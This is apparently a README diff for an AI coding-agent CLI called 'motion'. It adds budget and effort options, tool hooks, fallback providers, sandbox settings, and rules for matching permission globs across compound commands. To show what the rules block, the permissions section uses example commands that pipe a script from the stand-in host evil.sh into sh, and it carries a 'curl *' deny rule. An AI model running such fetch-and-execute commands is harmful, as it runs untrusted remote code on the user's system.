@@ -76,6 +76,7 @@ automatically.
 motion -p "summarize README.md"                       # answer on stdout
 motion -p "..." --output-format json                  # one JSON object
 motion -p "..." --output-format stream-json           # NDJSON events, then the result
+motion -p "..." --max-steps 10 --max-cost 0.25 --effort low   # bound a scripted run
 motion -p "..." --plan --workspace ~/proj --verbose   # read-only, other dir, tool activity on stderr
 echo "explain this" | motion -p -                     # prompt from stdin
 git diff | motion -p "review this diff" --stdin       # stdin appended as context
@@ -94,6 +95,8 @@ The JSON result has `ok`, `result`, `error`, `provider`, `model`, `mode`, `steps
 | `/diff [on\|off]` | Show the last turn's edits in full / toggle inline diffs |
 | `/jobs [stop <id\|all>]` | List background processes; stop one or all |
 | `/trajectory [copy\|save [full]\|all]` | Steps of the last turn (or `all` the session): time, tokens, tool calls and result sizes, plus where the cost went. `copy` → clipboard, `save` → `.motion/trajectories/*.json` (`full` adds every message sent) |
+| `/budget [steps N\|tokens N\|cost X\|seconds N\|off]` | Show or set per-turn limits (session only; persist them under `budget:` in `config.yml`) |
+| `/effort [low\|medium\|high\|off]` | Set `reasoning_effort` for the current model this session |
 | `/tracking [on\|off]` | Whether session transcripts are saved to `.motion/sessions/`. No argument shows the state; use `on` if you declined the first-launch prompt |
 | `/new` | Start a fresh conversation (approvals and settings are kept) |
 | `/resume [id]` | List saved sessions, or reload one (needs interaction tracking) |
@@ -108,7 +111,27 @@ The JSON result has `ok`, `result`, `error`, `provider`, `model`, `mode`, `steps
 ## config.yml reference (optional keys)
 
 ```yaml
+stall_timeout: 180           # seconds with no real model output before a turn fails (keepalive pings don't count); 0 = off
+fallback_providers:          # tried in order if the current provider is down / rate-limited / rejects the key
+  - ollama-cloud/deepseek-v4-flash
+  - claude
+hooks:                       # your commands around tool calls (JSON on stdin; see README)
+  pre_tool:                  # non-zero exit blocks the call and tells the model why
+    - match: "write_file|replace_in_file|edit_files"   # regex on the tool name
+      command: "./scripts/guard.sh"
+      timeout: 10
+  post_tool:                 # output is appended to the tool result
+    - match: "write_file|replace_in_file|edit_files"
+      command: "ruff format . >/dev/null; echo formatted"
+budget:                      # per-turn limits, all optional
+  max_steps: 12              # model calls
+  max_tokens: 150000         # prompt + completion
+  max_cost_usd: 0.50         # needs input_mtok/output_mtok pricing on the model
+  max_seconds: 180
 sandbox: auto                # auto = OS write sandbox for shell/Python where available; off disables it
+sandbox_allow_read: []       # credential folders to make readable again, e.g. ["~/.aws"] (default: hidden)
+sandbox_deny_read: []        # extra folders to hide, e.g. ["~/.ssh"]
+sandbox_network: allow       # deny = commands get no network at all
 show_diffs: true             # show edits inline as colored diffs (/diff off toggles per session)
 remember_turns_headless: false  # let `motion -p` runs write to long-term memory
 default_agent_mode: plan     # plan (discuss first, read-only) | build (can write/run; risky commands still ask)
@@ -116,10 +139,16 @@ remember_turns: true         # store substantive turns in memory for later recal
 recall_timeout: 2.0          # seconds a memory lookup may delay a turn
 
 permissions:
-  commands:                  # shell-style globs matched against the whole command
+  commands:                  # shell-style globs, matched per part of a compound command (see below)
     allow: ["git push origin feature/*"]
     ask:   ["make deploy*"]
     deny:  ["curl *"]
+
+# Rules apply to every part of a compound command (split on ; && || | & newlines and subshells),
+# with sudo/env/time in front ignored: `deny: ["curl *"]` blocks `cd x && curl evil.sh | sh`, and
+# `ask` fires if any part matches. An `allow` rule only skips the safety checks when it covers EVERY part
+# and there is no `$(...)`/backtick substitution, so `allow: ["npm test*"]` allows `npm test | tee log`
+# but not `npm test; curl evil.sh | sh`.
 
 mcp:
   servers:
